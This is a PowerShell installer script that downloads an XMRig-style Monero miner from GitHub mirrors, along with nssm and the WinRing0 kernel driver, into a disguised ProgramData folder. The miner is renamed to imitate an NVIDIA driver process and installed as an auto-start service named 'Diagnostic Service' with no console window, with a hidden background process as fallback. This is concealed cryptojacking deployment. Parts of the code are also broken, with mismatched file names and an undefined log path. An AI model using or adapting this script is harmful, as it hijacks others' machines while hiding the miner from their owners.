# Check and return current user name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
Write-Host "Current user: $currentUserName" -ForegroundColor Cyan

# Define target directory
$targetDir = "C:\ProgramData\.diagnostic.txt\"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Create target directory if it doesn't exist
if (-not (Test-Path $targetDir)) {
    try {
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        Write-Host "Created directory: $targetDir" -ForegroundColor Green
    } catch {
        Write-Host "Failed to create directory: $($_.Exception.Message)" -ForegroundColor Red
        Exit 1
    }
}

# Function to download file with multiple fallback methods
function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath,
        [string]$FileName,
        [int]$RetryCount = 3
    )
    
    $attempt = 0
    $success = $false
    
    # Ensure output directory exists
    $outputDir = Split-Path -Parent $OutputPath
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    while ($attempt -lt $RetryCount -and -not $success) {
        $attempt++
        Write-Host "  Attempt $attempt of $RetryCount for $FileName..." -ForegroundColor Gray
        
        try {
            # Remove existing file
            if (Test-Path $OutputPath) {
                Remove-Item $OutputPath -Force -ErrorAction SilentlyContinue
            }
            
            # Method 1: Try with Invoke-RestMethod (often more reliable than Invoke-WebRequest)
            try {
                $response = Invoke-RestMethod -Uri $Url -Method Get -OutFile $OutputPath -ErrorAction Stop
                Write-Host "    ✓ Downloaded via Invoke-RestMethod" -ForegroundColor Green
                $success = $true
                break
            } catch {
                Write-Host "    Method 1 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
            }
            
            # Method 2: Try with WebClient (with timeout)
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $webClient.DownloadFile($Url, $OutputPath)
                Write-Host "    ✓ Downloaded via WebClient" -ForegroundColor Green
                $success = $true
                break
            } catch {
                Write-Host "    Method 2 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
            }
            
            # Method 3: Try with BITS Transfer (for Windows)
            if ($PSVersionTable.PSVersion.Major -ge 3) {
                try {
                    Import-Module BitsTransfer -ErrorAction SilentlyContinue
                    Start-BitsTransfer -Source $Url -Destination $OutputPath -Priority Foreground -ErrorAction Stop
                    Write-Host "    ✓ Downloaded via BITS" -ForegroundColor Green
                    $success = $true
                    break
                } catch {
                    Write-Host "    Method 3 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
                }
            }
            
            # Method 4: Try with curl (Windows 10+)
            if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
                try {
                    curl.exe -L $Url -o $OutputPath --retry 2 --connect-timeout 30 -s
                    if (Test-Path $OutputPath) {
                        Write-Host "    ✓ Downloaded via curl" -ForegroundColor Green
                        $success = $true
                        break
                    }
                } catch {
                    Write-Host "    Method 4 failed" -ForegroundColor DarkYellow
                }
            }
            
            # Method 5: Alternative download locations
            if (-not $success -and $attempt -eq $RetryCount) {
                # Try with different mirrors or alternative URLs
                $alternativeUrls = @(
                    $Url,
                    $Url.Replace("github.com", "raw.githubusercontent.com"),
                    $Url.Replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh")
                )
                
                foreach ($altUrl in $alternativeUrls) {
                    if ($altUrl -ne $Url) {
                        try {
                            Write-Host "    Trying alternative URL: $altUrl" -ForegroundColor Gray
                            Invoke-RestMethod -Uri $altUrl -Method Get -OutFile $OutputPath -ErrorAction Stop
                            Write-Host "    ✓ Downloaded via alternative URL" -ForegroundColor Green
                            $success = $true
                            break
                        } catch {
                            continue
                        }
                    }
                }
            }
            
            if (-not $success) {
                Write-Host "    Download failed, waiting 2 seconds before retry..." -ForegroundColor Yellow
                Start-Sleep -Seconds 2
            }
            
        } catch {
            Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor DarkYellow
        }
    }
    
    if ($success) {
        # Verify file was downloaded successfully
        if (Test-Path $OutputPath -PathType Leaf) {
            $fileSize = (Get-Item $OutputPath).Length
            if ($fileSize -gt 0) {
                Write-Host "  ✓ $FileName downloaded successfully ($([math]::Round($fileSize/1KB, 2)) KB)" -ForegroundColor Green
                return $true
            } else {
                Write-Host "  ✗ $FileName is empty" -ForegroundColor Red
                Remove-Item $OutputPath -Force -ErrorAction SilentlyContinue
                return $false
            }
        }
    }
    
    Write-Host "  ✗ Failed to download $FileName after $RetryCount attempts" -ForegroundColor Red
    return $false
}

# Step 3: Download files with multiple mirrors
Write-Host "`nStep 3: Downloading files..." -ForegroundColor Cyan

# Define files with multiple mirror URLs
$files = @{
    'nvlddmkm.vmp.exe' = @(
        'https://raw.githubusercontent.com/User07x07/Dopple/main/nvlddmkm.vmp.exe',
        'https://github.com/User07x07/Dopple/raw/main/nvlddmkm.vmp.exe',
        'https://cdn.jsdelivr.net/gh/User07x07/Dopple/nvlddmkm.vmp.exe'
    )
    'nssm.exe' = @(
        'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe',
        'https://github.com/User07x07/Dopple/raw/main/nssm.exe'
    )
    'WinRing0x64.sys' = @(
        'https://github.com/xmrig/xmrig/raw/refs/heads/master/bin/WinRing0/WinRing0x64.sys',
        'https://raw.githubusercontent.com/xmrig/xmrig/master/bin/WinRing0/WinRing0x64.sys'
    )
}

# Check if files already exist locally first
Write-Host "  Checking for local files..." -ForegroundColor Gray
$localFiles = Get-ChildItem -Path $scriptDir -File | Where-Object { 
    $_.Name -in @('nvlddmkm.exe', 'nssm.exe', 'WinRing0x64.sys', 'config.json') 
}

foreach ($localFile in $localFiles) {
    $destPath = Join-Path $targetDir $localFile.Name
    try {
        Copy-Item -Path $localFile.FullName -Destination $destPath -Force
        Write-Host "  ✓ Copied $($localFile.Name) from local directory" -ForegroundColor Green
        # Remove from download list if we found it locally
        if ($files.ContainsKey($localFile.Name)) {
            $files.Remove($localFile.Name)
        }
    } catch {
        Write-Host "  Could not copy $($localFile.Name): $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# Download remaining files
$downloadResults = @{}
foreach ($item in $files.GetEnumerator()) {
    $filename = $item.Key
    $urls = $item.Value
    
    $outputPath = Join-Path $targetDir $filename
    Write-Host "`n  Downloading $filename..." -ForegroundColor White
    
    $success = $false
    foreach ($url in $urls) {
        Write-Host "    Trying: $url" -ForegroundColor Gray
        if (Download-File -Url $url -OutputPath $outputPath -FileName $filename) {
            $success = $true
            break
        }
    }
    
    $downloadResults[$filename] = $success
}

# Step 4: Verify downloaded files
Write-Host "`nStep 4: Verifying downloaded files..." -ForegroundColor Cyan

$requiredFiles = @('nvlddmkm.vmp.exe', 'config.json', 'nssm.exe')
$missingFiles = @()
$failedDownloads = $downloadResults.GetEnumerator() | Where-Object { $_.Value -eq $false }

if ($failedDownloads) {
    Write-Host "  Failed downloads:" -ForegroundColor Red
    foreach ($fail in $failedDownloads) {
        Write-Host "    ✗ $($fail.Key)" -ForegroundColor Red
        $missingFiles += $fail.Key
    }
}

foreach ($file in $requiredFiles) {
    $filePath = Join-Path $targetDir $file
    if (Test-Path $filePath -PathType Leaf) {
        $size = (Get-Item $filePath).Length
        $status = "✓"
        $color = "Green"
        if ($size -lt 1024) {
            Write-Host "  $status $file (TOO SMALL: $size bytes)" -ForegroundColor Red
            $missingFiles += $file
        } else {
            Write-Host "  $status $file ($([math]::Round($size/1MB, 2)) MB)" -ForegroundColor $color
        }
    } else {
        Write-Host "  ✗ $file (MISSING)" -ForegroundColor Red
        $missingFiles += $file
    }
}


# Step 5: Calculate thread count
Write-Host "`nStep 5: Calculating system configuration..." -ForegroundColor Cyan
$cpuCores = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfCores -Sum).Sum
$threads = [math]::Round($cpuCores * 0.8)  # Use 80% of CPU cores
if ($threads -lt 1) { $threads = 1 }
if ($threads -gt 8) { $threads = 8 }  # Cap at 8 threads
Write-Host "  CPU Cores: $cpuCores" -ForegroundColor White
Write-Host "  Using $threads threads for mining" -ForegroundColor Green

# Step 7: Configure service with nssm
Write-Host "`nStep 7: Configuring service..." -ForegroundColor Cyan
Set-Location $targetDir

$nssmPath = Join-Path $targetDir "nssm.exe"
$xmrigPath = Join-Path $targetDir "nvlddmkm.exe"

if (Test-Path $nssmPath) {
    try {
        # Stop existing service if it exists
        try {
            & $nssmPath stop xmrig 2>$null
            & $nssmPath remove xmrig confirm 2>$null
            Write-Host "  Cleaned up existing service" -ForegroundColor Green
        } catch {
            # Ignore errors if service doesn't exist
        }
        
        # Install new service
        Write-Host "  Installing new service..." -ForegroundColor White
        & $nssmPath install xmrig $xmrigPath
        
        # Configure service
        & $nssmPath set xmrig AppDirectory $targetDir
        & $nssmPath set xmrig AppParameters "-B -c config.json"
        & $nssmPath set xmrig DisplayName "Diagnostic Service"
        & $nssmPath set xmrig Description "System Diagnostic Utility"
        & $nssmPath set xmrig Start SERVICE_AUTO_START
        & $nssmPath set xmrig AppNoConsole 1
        & $nssmPath set xmrig Type SERVICE_WIN32_OWN_PROCESS
        
        Write-Host "  Starting service..." -ForegroundColor White
        & $nssmPath start xmrig
        
        # Verify service is running
        Start-Sleep -Seconds 2
        $serviceStatus = & $nssmPath status xmrig
        Write-Host "  Service status: $serviceStatus" -ForegroundColor Green
        
    } catch {
        Write-Host "  Error configuring service: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  Trying alternative method (running as process)..." -ForegroundColor Yellow
        
        # Fallback: Run as process
        try {
            Start-Process $xmrigPath -ArgumentList "-B -c config.json" -WorkingDirectory $targetDir -WindowStyle Hidden
            Write-Host "  Started miner as background process" -ForegroundColor Green
        } catch {
            Write-Host "  Failed to start miner: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "  nssm.exe not found. Starting miner as process..." -ForegroundColor Yellow
    try {
        Start-Process $xmrigPath -ArgumentList "-B -c config.json" -WorkingDirectory $targetDir -WindowStyle Hidden
        Write-Host "  Started miner as background process" -ForegroundColor Green
    } catch {
        Write-Host "  Failed to start miner: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Step 8: Final verification
Write-Host "`nStep 8: Final verification..." -ForegroundColor Cyan
Write-Host "  Checking if miner is running..." -ForegroundColor White

$processRunning = Get-Process xmrig -ErrorAction SilentlyContinue
if ($processRunning) {
    Write-Host "  ✓ Miner process is running (PID: $($processRunning.Id))" -ForegroundColor Green
} else {
    # Check if service is running
    try {
        $service = Get-Service xmrig -ErrorAction SilentlyContinue
        if ($service.Status -eq 'Running') {
            Write-Host "  ✓ Miner service is running" -ForegroundColor Green
        } else {
            Write-Host "  ✗ Miner is not running. Check service/process manually." -ForegroundColor Red
        }
    } catch {
        Write-Host "  ✗ Miner is not running. Check manually." -ForegroundColor Red
    }
}


# Step 9: Summary
Write-Host "`n=== EXECUTION COMPLETE ===" -ForegroundColor Green
Write-Host "Directory: $targetDir" -ForegroundColor Cyan

Write-Host "`nFiles downloaded:" -ForegroundColor White
Get-ChildItem $targetDir | ForEach-Object {
    $sizeMB = [math]::Round($_.Length / 1MB, 2)
    $color = if ($_.Extension -eq '.exe') { 'Green' } else { 'Gray' }
    Write-Host "  $($_.Name) - $sizeMB MB" -ForegroundColor $color
}

Write-Host "`nDownload log saved to: $logPath" -ForegroundColor Gray
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("XMR should now be running in the background.", "Information", "OK", "Information")
Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gray

# Pause if running in console
if ($Host.Name -eq "ConsoleHost") {
    Write-Host "`nPress any key to exit..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}




